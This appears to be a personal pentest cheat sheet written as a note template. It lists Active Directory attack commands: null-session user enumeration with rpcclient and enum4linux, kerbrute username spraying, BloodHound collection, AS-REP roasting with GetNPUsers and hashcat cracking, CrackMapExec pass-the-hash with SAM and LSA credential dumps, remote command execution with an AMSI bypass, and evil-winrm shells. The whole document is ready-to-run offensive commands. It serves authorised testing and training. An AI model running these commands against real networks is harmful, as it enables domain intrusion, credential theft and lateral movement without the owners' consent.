# Active Directory
Extra attacks [Active Directory Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
## User Enum

### Enum4Linux
```bash
enum4linux -U <% tp.frontmatter.dc_ip %>  | grep "user:" | awk -F'[][]' '{print $2}' | tee users
```

### RPCClient 
**Null session**
```bash
rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c 'enumdomusers' | awk -F'[][]' '{print $2}' | tee users
```

**If you would like all RIDs**
```bash
rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c 'enumdomusers' | awk -F'[][]' '{print $4}' | tee RIDs
```

**Query each user for additional information**
```
cat RIDs | while read rid; do rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c "queryuser $rid"; done
```

**Get all groups**
```bash
rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c 'enumdomgroups'
```

## Kerbrute
**Change wordlist if you  have put together a custom one**
```bash
kerbrute userenum -d <% tp.frontmatter.domain %> --dc <% tp.frontmatter.dc_ip %> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

## Bloodhound
### Start server
#### Start Neo4j server
```bash
sudo neo4j console
```

#### Start bloodhound
```bash
bloodhound
```

### Gathering data
#### Sharphound
Download [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
```powershell
Import-Module .\SharpShound.ps1
```

##### Collection data
```powershell
Invoke-BloodHound -CollectionMethod ALL -Domain <%tp.frontmatter.domain %> -ZipFileName file.zip
```

#### Python bloodhound
```bash
sudo bloodhound-python -u '<user>' -p '<password>' -ns <% tp.frontmatter.dc_ip %> -d <% tp.frontmatter.domain %> -c all --zip
```

## Attacking users

### GetNPUsers

```bash
GetNPUsers.py '<% tp.frontmatter.domain %>/' -usersfile users -format hashcat -outputfile hashes -dc-ip <% tp.frontmatter.dc_ip %>
```

#### Hashcat
```bash
hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt
```

### CrackMapExec
#### Generic basic command
```bash
crackmapexec <protocol> <ip/cidr> -u <user> -d <domain> -p <pass>
```

#### Check creds against SMB
```bash
sudo crackmapexec smb <% tp.frontmatter.target_ip %> -u <user> -p <password>
```

#### List shares
```bash
sudo crackmapexec smb <% tp.frontmatter.target_ip %> -u <user> -p <password> --shares
```

#### Testing winrm
```bash
sudo crackmapexec winrm <% tp.frontmatter.target_ip %> -u <user> -p <password> --shares
```

#### Testing multiple users
```bash
sudo crackmapexec smb <% tp.frontmatter.target_ip %> -u <user_txt> -p <password>
```

#### Using Hash
```bash
crackmapexec smb <% tp.frontmatter.target_ip %> -u <user> -H <NT Hash> --local-auth
```

#### Using Hash dump SAM
```bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --sam
```

#### Using Hash sump LSA
```bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --lsa
```

#### Discovering more users
```bash
sudo crackmapexec smb <% tp.frontmatter.target_ip %> -u <user> -p <password> --users
```

#### Logged on users
```bash
sudo crackmapexec smb <% tp.frontmatter.target_ip %> -u <user> -p <password> --loggedon-users
```

#### Execute command
```bash
crackmapexec <% tp.frontmatter.target_ip %> -u <user> -p <password> -x <cmd>
```

#### AMSI bypass
```bash
crackmapexec <% tp.frontmatter.target_ip %> -u <user> -p <password> -x <cmd> --amsi-bypass <path_payload>
```

### Evil winrm
#### Passing hash
```bash
evil-winrm -i <% tp.frontmatter.target_ip %> -u <user> -H <NTLM>
```

#### Using creds
```bash
evil-winrm -i <% tp.frontmatter.target_ip %> -u <user> -p <pass>
```

#### Commands with evil-winrm shell
```powershell
[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```
